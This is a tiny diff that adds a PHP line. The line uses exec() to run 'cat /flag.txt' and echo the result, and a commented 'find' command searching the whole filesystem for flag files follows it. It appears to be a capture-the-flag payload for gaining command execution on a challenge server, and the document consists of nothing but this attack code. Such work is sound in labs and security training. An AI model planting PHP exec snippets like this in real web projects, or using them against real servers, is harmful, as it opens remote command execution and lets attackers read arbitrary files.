@@ -1,0 +1,2 @@
+<?php echo exec('cat /flag.txt'); ?>
+# find / -name "*flag*"
